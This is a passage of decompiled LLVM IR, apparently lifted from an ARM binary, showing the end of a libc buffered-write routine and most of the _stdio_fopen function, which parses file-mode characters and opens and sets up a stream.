  %v0_1b650.in = phi i32 [ %v5_1b668, %dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge ], [ %arg3, %entry ]
  %v3_1b650 = phi i32 [ %v5_1b668, %dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge ], [ %arg3, %entry ]
  %v0_1b650 = icmp slt i32 %v0_1b650.in, 0
  %storemerge = select i1 %v0_1b650, i32 %v3_1b64c, i32 %v3_1b650
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_1b654, i32* %r1.global-to-local, align 4
  %v1_1b658 = add i32 %v0_1b658, 4
  %v2_1b658 = inttoptr i32 %v1_1b658 to i32*
  %v3_1b658 = load i32, i32* %v2_1b658, align 4
  %v3_1b65c = call i32 @__GI___libc_write(i32 %v3_1b658, i32 %v0_1b654)
  %v1_1b660 = icmp slt i32 %v3_1b65c, 0
  %v2_1b660 = icmp eq i32 %v3_1b65c, 0
  store i1 %v2_1b660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1b660, label %dec_label_pc_1b670, label %dec_label_pc_1b6f4thread-pre-split

dec_label_pc_1b670:                               ; preds = %dec_label_pc_1b64c
  %v0_1b670 = load i32, i32* @r4, align 4
  %v1_1b670 = inttoptr i32 %v0_1b670 to i16*
  %v2_1b670 = load i16, i16* %v1_1b670, align 2
  %v1_1b674 = or i16 %v2_1b670, 8
  store i16 %v1_1b674, i16* %v1_1b670, align 2
  store i32 92668, i32* %r3.global-to-local, align 4
  %v0_1b680 = call i32 @__aeabi_read_tp()
  %v3_1b684 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1b684 = sext i16 %v3_1b684 to i32
  store i32 %v4_1b684, i32* %r3.global-to-local, align 4
  %v2_1b688 = add i32 %v4_1b684, %v0_1b680
  %v3_1b688 = inttoptr i32 %v2_1b688 to i32*
  %v4_1b688 = load i32, i32* %v3_1b688, align 4
  store i32 %v4_1b688, i32* %r3.global-to-local, align 4
  %v7_1b68c = icmp eq i32 %v4_1b688, 4
  store i1 %v7_1b68c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b68c, label %dec_label_pc_1b698, label %bb21

bb21:                                             ; preds = %dec_label_pc_1b670
  %v8_1b690 = icmp eq i32 %v4_1b688, 11
  store i1 %v8_1b690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1b690, label %dec_label_pc_1b698, label %dec_label_pc_1b6fc

dec_label_pc_1b698:                               ; preds = %dec_label_pc_1b670, %bb21
  %v0_1b698 = load i32, i32* @r4, align 4
  %v1_1b698 = add i32 %v0_1b698, 8
  store i32 %v1_1b698, i32* %r2.global-to-local, align 4
  %v1_1b69c = inttoptr i32 %v1_1b698 to i32*
  %v2_1b69c = load i32, i32* %v1_1b69c, align 4
  store i32 %v2_1b69c, i32* %r2.global-to-local, align 4
  %v3_1b69c = add i32 %v0_1b698, 12
  %v4_1b69c = inttoptr i32 %v3_1b69c to i32*
  %v5_1b69c = load i32, i32* %v4_1b69c, align 4
  store i32 %v5_1b69c, i32* %r3.global-to-local, align 4
  %v2_1b6a0 = sub i32 %v5_1b69c, %v2_1b69c
  store i32 %v2_1b6a0, i32* %r1.global-to-local, align 4
  %v9_1b6a0 = icmp eq i32 %v5_1b69c, %v2_1b69c
  store i1 %v9_1b6a0, i1* %cpsr_z.global-to-local, align 1
  %v0_1b6ec.pre = load i32, i32* @r5, align 4
  br i1 %v9_1b6a0, label %dec_label_pc_1b6ec, label %dec_label_pc_1b6a8

dec_label_pc_1b6a8:                               ; preds = %dec_label_pc_1b698
  %v3_1b6a8 = icmp ult i32 %v2_1b6a0, %v0_1b6ec.pre
  %v9_1b6a8 = icmp eq i32 %v2_1b6a0, %v0_1b6ec.pre
  store i1 %v9_1b6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1b6a8, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_1b6a8
  store i32 %v0_1b6ec.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_1b6a8, %bb22, %dec_label_pc_1b6d0
  %v2_1b6bc = phi i32 [ %v1_1b6d4, %dec_label_pc_1b6d0 ], [ %v2_1b69c, %bb22 ], [ %v2_1b69c, %dec_label_pc_1b6a8 ]
  %v0_1b6b0 = load i32, i32* @r6, align 4
  %v1_1b6b0 = inttoptr i32 %v0_1b6b0 to i8*
  %v2_1b6b0 = load i8, i8* %v1_1b6b0, align 1
  %v3_1b6b0 = zext i8 %v2_1b6b0 to i32
  store i32 %v3_1b6b0, i32* %r3.global-to-local, align 4
  %v7_1b6b4 = icmp eq i8 %v2_1b6b0, 10
  store i1 %v7_1b6b4, i1* %cpsr_z.global-to-local, align 1
  %v1_1b6b8 = add i32 %v0_1b6b0, 1
  store i32 %v1_1b6b8, i32* @r6, align 4
  %v3_1b6bc = inttoptr i32 %v2_1b6bc to i8*
  store i8 %v2_1b6b0, i8* %v3_1b6bc, align 1
  %v0_1b6c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b6c0, label %dec_label_pc_1b6c4, label %dec_label_pc_1b6d0

dec_label_pc_1b6c4:                               ; preds = %.preheader
  %v0_1b6c4 = load i32, i32* @r4, align 4
  %v1_1b6c4 = inttoptr i32 %v0_1b6c4 to i16*
  %v2_1b6c4 = load i16, i16* %v1_1b6c4, align 2
  %v3_1b6c4 = zext i16 %v2_1b6c4 to i32
  store i32 %v3_1b6c4, i32* %r3.global-to-local, align 4
  %v1_1b6c8 = and i32 %v3_1b6c4, 256
  %v2_1b6c8 = icmp eq i32 %v1_1b6c8, 0
  store i1 %v2_1b6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b6c8, label %dec_label_pc_1b6d0, label %dec_label_pc_1b6c4.dec_label_pc_1b6dc_crit_edge

dec_label_pc_1b6c4.dec_label_pc_1b6dc_crit_edge:  ; preds = %dec_label_pc_1b6c4
  %v0_1b6e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b6dc

dec_label_pc_1b6d0:                               ; preds = %dec_label_pc_1b6c4, %.preheader
  %v0_1b6d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b6d0 = add i32 %v0_1b6d0, -1
  store i32 %v1_1b6d0, i32* %r1.global-to-local, align 4
  %v7_1b6d0 = icmp eq i32 %v0_1b6d0, 1
  store i1 %v7_1b6d0, i1* %cpsr_z.global-to-local, align 1
  %v0_1b6d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b6d4 = add i32 %v0_1b6d4, 1
  store i32 %v1_1b6d4, i32* %r2.global-to-local, align 4
  br i1 %v7_1b6d0, label %dec_label_pc_1b6d0.dec_label_pc_1b6dc_crit_edge, label %.preheader

dec_label_pc_1b6d0.dec_label_pc_1b6dc_crit_edge:  ; preds = %dec_label_pc_1b6d0
  %v0_1b6dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b6dc

dec_label_pc_1b6dc:                               ; preds = %dec_label_pc_1b6c4.dec_label_pc_1b6dc_crit_edge, %dec_label_pc_1b6d0.dec_label_pc_1b6dc_crit_edge
  %v0_1b6e0 = phi i32 [ %v1_1b6d4, %dec_label_pc_1b6d0.dec_label_pc_1b6dc_crit_edge ], [ %v0_1b6e0.pre, %dec_label_pc_1b6c4.dec_label_pc_1b6dc_crit_edge ]
  %v0_1b6dc = phi i32 [ %v0_1b6dc.pre, %dec_label_pc_1b6d0.dec_label_pc_1b6dc_crit_edge ], [ %v0_1b6c4, %dec_label_pc_1b6c4.dec_label_pc_1b6dc_crit_edge ]
  %v1_1b6dc = add i32 %v0_1b6dc, 8
  %v2_1b6dc = inttoptr i32 %v1_1b6dc to i32*
  %v3_1b6dc = load i32, i32* %v2_1b6dc, align 4
  store i32 %v3_1b6dc, i32* %r3.global-to-local, align 4
  %v2_1b6e0 = add i32 %v0_1b6dc, 16
  %v3_1b6e0 = inttoptr i32 %v2_1b6e0 to i32*
  store i32 %v0_1b6e0, i32* %v3_1b6e0, align 4
  %v0_1b6e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b6e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b6e4 = sub i32 %v1_1b6e4, %v0_1b6e4
  store i32 %v2_1b6e4, i32* %r3.global-to-local, align 4
  %v1_1b6e8 = load i32, i32* @r5, align 4
  %v2_1b6e8 = sub i32 %v1_1b6e8, %v2_1b6e4
  br label %dec_label_pc_1b6ec

dec_label_pc_1b6ec:                               ; preds = %dec_label_pc_1b698, %dec_label_pc_1b6dc
  %v0_1b6ec = phi i32 [ %v2_1b6e8, %dec_label_pc_1b6dc ], [ %v0_1b6ec.pre, %dec_label_pc_1b698 ]
  %v1_1b6ec = load i32, i32* @r7, align 4
  %v2_1b6ec = sub i32 %v1_1b6ec, %v0_1b6ec
  store i32 %v2_1b6ec, i32* @r7, align 4
  br label %dec_label_pc_1b6fc

dec_label_pc_1b6f4thread-pre-split:               ; preds = %dec_label_pc_1b64c
  %v3_1b664 = load i32, i32* @r6, align 4
  %v5_1b664 = add i32 %v3_1b664, %v3_1b65c
  store i32 %v5_1b664, i32* @r6, align 4
  %v4_1b668 = load i32, i32* @r5, align 4
  %v5_1b668 = sub i32 %v4_1b668, %v3_1b65c
  store i32 %v5_1b668, i32* @r5, align 4
  %v2_1b6f4 = icmp eq i32 %v5_1b668, 0
  store i1 %v2_1b6f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b6f4, label %dec_label_pc_1b6fc, label %dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge

dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge: ; preds = %dec_label_pc_1b6f4thread-pre-split
  %v3_1b64c.pre = load i32, i32* @r8, align 4
  %v0_1b658.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b64c

dec_label_pc_1b6fc:                               ; preds = %dec_label_pc_1b6f4thread-pre-split, %entry, %bb21, %dec_label_pc_1b6ec
  %v0_1b6fc = load i32, i32* @r7, align 4
  store i32 %v15_1b630, i32* @r8, align 4
  ret i32 %v0_1b6fc

; uselistorder directives
  uselistorder i32 %v5_1b668, { 1, 3, 0, 2 }
  uselistorder i32 %v5_1b664, { 1, 0 }
  uselistorder i32 %v0_1b6dc, { 1, 0 }
  uselistorder i32 %v1_1b6d4, { 0, 2, 1 }
  uselistorder i32 %v0_1b6d0, { 1, 0 }
  uselistorder i32 %v0_1b6ec.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_1b69c, { 1, 0, 2 }
  uselistorder i32 %v2_1b69c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1b65c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1b654, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1b6fc, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_1b6ec, { 1, 0 }
  uselistorder label %dec_label_pc_1b6dc, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b698, { 1, 0 }
  uselistorder label %dec_label_pc_1b64c, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1b70c = load i32, i32* @r4, align 4
  store i32 %v3_1b70c, i32* %stack_var_-24, align 4
  %v6_1b70c = load i32, i32* @r5, align 4
  %v9_1b70c = load i32, i32* @r6, align 4
  %v12_1b70c = load i32, i32* @r7, align 4
  %v15_1b70c = load i32, i32* @r8, align 4
  %v0_1b710 = load i32, i32* @r1, align 4
  %v1_1b710 = inttoptr i32 %v0_1b710 to i8*
  %v2_1b710 = load i8, i8* %v1_1b710, align 1
  %v3_1b710 = zext i8 %v2_1b710 to i32
  store i32 %v3_1b710, i32* @ip, align 4
  %v2_1b718 = icmp ugt i8 %v2_1b710, 113
  store i1 %v2_1b718, i1* %cpsr_c.global-to-local, align 1
  %v7_1b718 = icmp eq i8 %v2_1b710, 114
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r8, align 4
  %v0_1b724 = load i32, i32* @r0, align 4
  store i32 %v0_1b724, i32* @r7, align 4
  %v0_1b728 = load i32, i32* @r2, align 4
  store i32 %v0_1b728, i32* @r5, align 4
  %v0_1b72c = load i32, i32* @r3, align 4
  store i32 %v0_1b72c, i32* @r6, align 4
  br i1 %v7_1b718, label %dec_label_pc_1b780, label %dec_label_pc_1b734

dec_label_pc_1b734:                               ; preds = %entry
  %v2_1b734 = icmp ugt i8 %v2_1b710, 118
  store i1 %v2_1b734, i1* %cpsr_c.global-to-local, align 1
  %v7_1b734 = icmp eq i8 %v2_1b710, 119
  br i1 %v7_1b734, label %bb, label %dec_label_pc_1b740

bb:                                               ; preds = %dec_label_pc_1b734
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1b784

dec_label_pc_1b740:                               ; preds = %dec_label_pc_1b734
  %v2_1b740 = icmp ugt i8 %v2_1b710, 96
  store i1 %v2_1b740, i1* %cpsr_c.global-to-local, align 1
  %v7_1b740 = icmp eq i8 %v2_1b710, 97
  br i1 %v7_1b740, label %bb49, label %dec_label_pc_1b74c

bb49:                                             ; preds = %dec_label_pc_1b740
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1b784

dec_label_pc_1b74c:                               ; preds = %dec_label_pc_1b740, %dec_label_pc_1b81c, %dec_label_pc_1b7f0
  store i32 92460, i32* %r2.global-to-local, align 4
  %v0_1b750 = call i32 @__aeabi_read_tp()
  store i32 %v0_1b750, i32* %r0.global-to-local, align 4
  %v3_1b754 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1b754 = sext i16 %v3_1b754 to i32
  store i32 %v4_1b754, i32* @r2, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_1b75c = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b75c = icmp eq i32 %v0_1b75c, 0
  %v3_1b760 = add i32 %v4_1b754, %v0_1b750
  %v4_1b760 = inttoptr i32 %v3_1b760 to i32*
  store i32 22, i32* %v4_1b760, align 4
  br i1 %v2_1b75c, label %dec_label_pc_1bb24, label %dec_label_pc_1b768

dec_label_pc_1b768:                               ; preds = %dec_label_pc_1b840._crit_edge, %dec_label_pc_1b74c
  %v0_1b768 = load i32, i32* @r5, align 4
  %v1_1b768 = inttoptr i32 %v0_1b768 to i16*
  %v2_1b768 = load i16, i16* %v1_1b768, align 2
  %v3_1b768 = zext i16 %v2_1b768 to i32
  store i32 %v3_1b768, i32* %r3.global-to-local, align 4
  %v1_1b76c = and i32 %v3_1b768, 8192
  %v2_1b76c = icmp eq i32 %v1_1b76c, 0
  br i1 %v2_1b76c, label %dec_label_pc_1bb24, label %dec_label_pc_1b774

dec_label_pc_1b774:                               ; preds = %dec_label_pc_1b768
  store i32 %v0_1b768, i32* @r0, align 4
  %v0_1b778 = call i32 @free()
  store i32 %v0_1b778, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bb24

dec_label_pc_1b780:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1b784

dec_label_pc_1b784:                               ; preds = %bb, %bb49, %dec_label_pc_1b780
  %v1_1b79c = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_1b780 ]
  %v1_1b784 = add i32 %v0_1b710, 1
  %v2_1b784 = inttoptr i32 %v1_1b784 to i8*
  %v3_1b784 = load i8, i8* %v2_1b784, align 1
  %v2_1b788 = icmp ugt i8 %v3_1b784, 97
  store i1 %v2_1b788, i1* %cpsr_c.global-to-local, align 1
  %v7_1b788 = icmp eq i8 %v3_1b784, 98
  %v1_1b784.v0_1b710 = select i1 %v7_1b788, i32 %v1_1b784, i32 %v0_1b710
  store i32 %v1_1b784.v0_1b710, i32* %r3.global-to-local, align 4
  %v1_1b794 = add i32 %v1_1b784.v0_1b710, 1
  %v2_1b794 = inttoptr i32 %v1_1b794 to i8*
  %v3_1b794 = load i8, i8* %v2_1b794, align 1
  %v4_1b794 = zext i8 %v3_1b794 to i32
  store i32 %v4_1b794, i32* @r3, align 4
  %v2_1b798 = icmp ugt i8 %v3_1b794, 42
  store i1 %v2_1b798, i1* %cpsr_c.global-to-local, align 1
  %v7_1b798 = icmp eq i8 %v3_1b794, 43
  br i1 %v7_1b798, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_1b784
  store i32 %v1_1b79c, i32* @r3, align 4
  %v2_1b7a0 = add nuw nsw i32 %v1_1b79c, 1
  store i32 %v2_1b7a0, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1b784, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b7a4 = icmp eq i32 %v0_1b728, 0
  br i1 %v2_1b7a4, label %dec_label_pc_1b7ac, label %dec_label_pc_1b7e8

dec_label_pc_1b7ac:                               ; preds = %.thread3
  store i32 68, i32* %r0.global-to-local, align 4
  %v1_1b7b0 = call i32 @malloc(i32 68)
  store i32 %v1_1b7b0, i32* %r0.global-to-local, align 4
  store i32 %v1_1b7b0, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1b7b4 = icmp eq i32 %v1_1b7b0, 0
  br i1 %v3_1b7b4, label %dec_label_pc_1bb28, label %dec_label_pc_1b7bc

dec_label_pc_1b7bc:                               ; preds = %dec_label_pc_1b7ac
  %v0_1b7c0 = load i32, i32* @r8, align 4
  %v2_1b7c0 = add i32 %v0_1b7c0, -34780
  store i32 %v2_1b7c0, i32* %r3.global-to-local, align 4
  %v1_1b7c4 = inttoptr i32 %v2_1b7c0 to i32*
  %v2_1b7c4 = load i32, i32* %v1_1b7c4, align 4
  store i32 %v2_1b7c4, i32* %r0.global-to-local, align 4
  %v3_1b7c4 = add i32 %v0_1b7c0, -34776
  %v4_1b7c4 = inttoptr i32 %v3_1b7c4 to i32*
  %v5_1b7c4 = load i32, i32* %v4_1b7c4, align 4
  store i32 %v5_1b7c4, i32* @r1, align 4
  %v6_1b7c4 = add i32 %v0_1b7c0, -34772
  %v7_1b7c4 = inttoptr i32 %v6_1b7c4 to i32*
  %v8_1b7c4 = load i32, i32* %v7_1b7c4, align 4
  store i32 %v8_1b7c4, i32* %r2.global-to-local, align 4
  %v2_1b7d0 = add i32 %v1_1b7b0, 8
  %v3_1b7d0 = inttoptr i32 %v2_1b7d0 to i32*
  store i32 0, i32* %v3_1b7d0, align 4
  store i32 8192, i32* @ip, align 4
  %v2_1b7d8 = load i32, i32* @r5, align 4
  %v3_1b7d8 = inttoptr i32 %v2_1b7d8 to i16*
  store i16 8192, i16* %v3_1b7d8, align 2
  %v2_1b7dc = load i32, i32* %r0.global-to-local, align 4
  %v0_1b7e0 = load i32, i32* @r5, align 4
  %v1_1b7e0 = add i32 %v0_1b7e0, 56
  store i32 %v1_1b7e0, i32* @r3, align 4
  %v1_1b7e4 = inttoptr i32 %v1_1b7e0 to i32*
  store i32 %v2_1b7dc, i32* %v1_1b7e4, align 4
  %v3_1b7e4 = add i32 %v0_1b7e0, 60
  %v4_1b7e4 = inttoptr i32 %v3_1b7e4 to i32*
  %v5_1b7e4 = load i32, i32* @r1, align 4
  store i32 %v5_1b7e4, i32* %v4_1b7e4, align 4
  %v6_1b7e4 = add i32 %v0_1b7e0, 64
  %v7_1b7e4 = inttoptr i32 %v6_1b7e4 to i32*
  %v8_1b7e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1b7e4, i32* %v7_1b7e4, align 4
  %v0_1b7e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b7e8

dec_label_pc_1b7e8:                               ; preds = %.thread3, %dec_label_pc_1b7bc
  %v0_1b840 = phi i32 [ %v0_1b72c, %.thread3 ], [ %v0_1b7e8.pre, %dec_label_pc_1b7bc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b7e8 = icmp slt i32 %v0_1b840, 0
  br i1 %v1_1b7e8, label %dec_label_pc_1b840, label %dec_label_pc_1b7f0

dec_label_pc_1b7f0:                               ; preds = %dec_label_pc_1b7e8
  %v0_1b7f4 = load i32, i32* @r4, align 4
  %v2_1b7f4 = and i32 %v0_1b7f4, 131075
  %v1_1b7f8 = add nuw nsw i32 %v2_1b7f4, 1
  store i32 %v1_1b7f8, i32* %r2.global-to-local, align 4
  %v0_1b7fc = load i32, i32* @r7, align 4
  %v1_1b7fc = add i32 %v0_1b7fc, 1
  %v2_1b800 = and i32 %v1_1b7fc, %v1_1b7f8
  store i32 %v2_1b800, i32* %r3.global-to-local, align 4
  %v3_1b804 = icmp uge i32 %v2_1b800, %v1_1b7f8
  store i1 %v3_1b804, i1* %cpsr_c.global-to-local, align 1
  %v9_1b804 = icmp eq i32 %v2_1b800, %v1_1b7f8
  %v1_1b808 = load i32, i32* @r5, align 4
  %v2_1b808 = add i32 %v1_1b808, 4
  %v3_1b808 = inttoptr i32 %v2_1b808 to i32*
  store i32 %v0_1b840, i32* %v3_1b808, align 4
  br i1 %v9_1b804, label %dec_label_pc_1b810, label %dec_label_pc_1b74c

dec_label_pc_1b810:                               ; preds = %dec_label_pc_1b7f0
  %v0_1b810 = load i32, i32* @r4, align 4
  %v1_1b810 = load i32, i32* @r7, align 4
  %v2_1b810 = sub i32 -1, %v1_1b810
  %v3_1b810 = and i32 %v0_1b810, %v2_1b810
  store i32 %v3_1b810, i32* @r3, align 4
  %v1_1b814 = and i32 %v3_1b810, 1024
  %v2_1b814 = icmp eq i32 %v1_1b814, 0
  br i1 %v2_1b814, label %dec_label_pc_1b834, label %dec_label_pc_1b81c

dec_label_pc_1b81c:                               ; preds = %dec_label_pc_1b810
  %v0_1b81c = load i32, i32* @r6, align 4
  store i32 %v0_1b81c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_1b828 = call i32 @__libc_fcntl(i32 %v0_1b81c, i32 4)
  store i32 %v2_1b828, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b82c = icmp eq i32 %v2_1b828, 0
  br i1 %v2_1b82c, label %dec_label_pc_1b81c.dec_label_pc_1b834_crit_edge, label %dec_label_pc_1b74c

dec_label_pc_1b81c.dec_label_pc_1b834_crit_edge:  ; preds = %dec_label_pc_1b81c
  %v0_1b834.pre = load i32, i32* @r7, align 4
  %v0_1b838.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b834

dec_label_pc_1b834:                               ; preds = %dec_label_pc_1b81c.dec_label_pc_1b834_crit_edge, %dec_label_pc_1b810
  %v0_1b838 = phi i32 [ %v0_1b838.pre, %dec_label_pc_1b81c.dec_label_pc_1b834_crit_edge ], [ %v0_1b810, %dec_label_pc_1b810 ]
  %v0_1b834 = phi i32 [ %v0_1b834.pre, %dec_label_pc_1b81c.dec_label_pc_1b834_crit_edge ], [ %v1_1b810, %dec_label_pc_1b810 ]
  %v1_1b834 = and i32 %v0_1b834, 131072
  store i32 %v1_1b834, i32* %r3.global-to-local, align 4
  %v2_1b838 = or i32 %v1_1b834, %v0_1b838
  store i32 %v2_1b838, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b864

dec_label_pc_1b840:                               ; preds = %dec_label_pc_1b7e8
  %v2_1b840 = icmp eq i32 %v0_1b840, -1
  store i1 %v2_1b840, i1* %cpsr_c.global-to-local, align 1
  %v7_1b840 = icmp eq i32 %v0_1b840, -1
  %v0_1b84c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1b840, label %dec_label_pc_1b840._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_1b840
  %v2_1b844 = or i32 %v0_1b84c.pre, 131072
  store i32 %v2_1b844, i32* @r4, align 4
  br label %dec_label_pc_1b840._crit_edge

dec_label_pc_1b840._crit_edge:                    ; preds = %dec_label_pc_1b840, %bb53
  %v0_1b84c = phi i32 [ %v2_1b844, %bb53 ], [ %v0_1b84c.pre, %dec_label_pc_1b840 ]
  %v0_1b848 = load i32, i32* @r7, align 4
  store i32 %v0_1b848, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1b854 = call i32 @__libc_open(i32 %v0_1b848, i32 %v0_1b84c)
  store i32 %v2_1b854, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b858 = icmp slt i32 %v2_1b854, 0
  %v1_1b85c = load i32, i32* @r5, align 4
  %v2_1b85c = add i32 %v1_1b85c, 4
  %v3_1b85c = inttoptr i32 %v2_1b85c to i32*
  store i32 %v2_1b854, i32* %v3_1b85c, align 4
  br i1 %v1_1b858, label %dec_label_pc_1b768, label %.dec_label_pc_1b864_crit_edge

.dec_label_pc_1b864_crit_edge:                    ; preds = %dec_label_pc_1b840._crit_edge
  %v0_1b868.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b864

dec_label_pc_1b864:                               ; preds = %.dec_label_pc_1b864_crit_edge, %dec_label_pc_1b834
  %v0_1b880 = phi i32 [ %v0_1b868.pre, %.dec_label_pc_1b864_crit_edge ], [ %v2_1b838, %dec_label_pc_1b834 ]
  %v0_1b864 = load i32, i32* @r5, align 4
  %v1_1b864 = inttoptr i32 %v0_1b864 to i16*
  %v2_1b864 = load i16, i16* %v1_1b864, align 2
  %v3_1b864 = zext i16 %v2_1b864 to i32
  %v1_1b868 = urem i32 %v0_1b880, 4
  %v1_1b86c = and i32 %v0_1b880, 1024
  %v1_1b870 = and i32 %v3_1b864, 8192
  %v1_1b874 = add nuw nsw i32 %v1_1b868, 1
  %v2_1b878 = or i32 %v1_1b870, %v1_1b86c
  store i32 %v2_1b878, i32* %r3.global-to-local, align 4
  %v1_1b87c = xor i32 %v1_1b874, 3
  %v1_1b880 = and i32 %v0_1b880, 131072
  store i32 %v1_1b880, i32* %r2.global-to-local, align 4
  %v2_1b880 = icmp eq i32 %v1_1b880, 0
  %v1_1b884 = add i32 %v0_1b864, 4
  %v2_1b884 = inttoptr i32 %v1_1b884 to i32*
  %v3_1b884 = load i32, i32* %v2_1b884, align 4
  store i32 %v3_1b884, i32* @r4, align 4
  br i1 %v2_1b880, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1b864
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1b864, %bb54
  %v0_1b890 = phi i32 [ 0, %dec_label_pc_1b864 ], [ 32768, %bb54 ]
  %v4_1b88c = mul nuw nsw i32 %v1_1b87c, 16
  %v5_1b88c = or i32 %v2_1b878, %v4_1b88c
  store i32 %v5_1b88c, i32* %r3.global-to-local, align 4
  %v2_1b890 = or i32 %v0_1b890, %v5_1b88c
  store i32 %v2_1b890, i32* %r2.global-to-local, align 4
  %v2_1b894 = icmp ugt i32 %v3_1b884, 2147483646
  store i1 %v2_1b894, i1* %cpsr_c.global-to-local, align 1
  %v8_1b894 = icmp eq i32 %v3_1b884, 2147483647
  %v1_1b898 = trunc i32 %v2_1b890 to i16
  store i16 %v1_1b898, i16* %v1_1b864, align 2
  br i1 %v8_1b894, label %dec_label_pc_1b8d8, label %dec_label_pc_1b8a0

dec_label_pc_1b8a0:                               ; preds = %bb55
  store i32 92120, i32* %r3.global-to-local, align 4
  %v0_1b8a4 = call i32 @__aeabi_read_tp()
  %v3_1b8a8 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1b8a8 = sext i16 %v3_1b8a8 to i32
  store i32 %v4_1b8a8, i32* @r3, align 4
  store i32 %v0_1b8a4, i32* @r6, align 4
  %v0_1b8b0 = load i32, i32* @r4, align 4
  store i32 %v0_1b8b0, i32* @r0, align 4
  %v2_1b8b4 = add i32 %v4_1b8a8, %v0_1b8a4
  %v3_1b8b4 = inttoptr i32 %v2_1b8b4 to i32*
  %v4_1b8b4 = load i32, i32* %v3_1b8b4, align 4
  store i32 %v4_1b8b4, i32* @r4, align 4
  %v1_1b8b8 = call i32 @isatty(i32 %v0_1b8b0)
  store i32 %v1_1b8b8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b8bc = icmp eq i32 %v1_1b8b8, 0
  br i1 %v2_1b8bc, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_1b8a0
  %v1_1b8c0 = load i32, i32* @r5, align 4
  %v2_1b8c0 = inttoptr i32 %v1_1b8c0 to i16*
  %v3_1b8c0 = load i16, i16* %v2_1b8c0, align 2
  %v4_1b8c0 = zext i16 %v3_1b8c0 to i32
  %v2_1b8c4 = or i32 %v4_1b8c0, 256
  store i32 %v2_1b8c4, i32* %r3.global-to-local, align 4
  %v2_1b8c8 = trunc i32 %v2_1b8c4 to i16
  store i16 %v2_1b8c8, i16* %v2_1b8c0, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_1b8a0, %bb56
  %v3_1b8d0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1b8d0 = sext i16 %v3_1b8d0 to i32
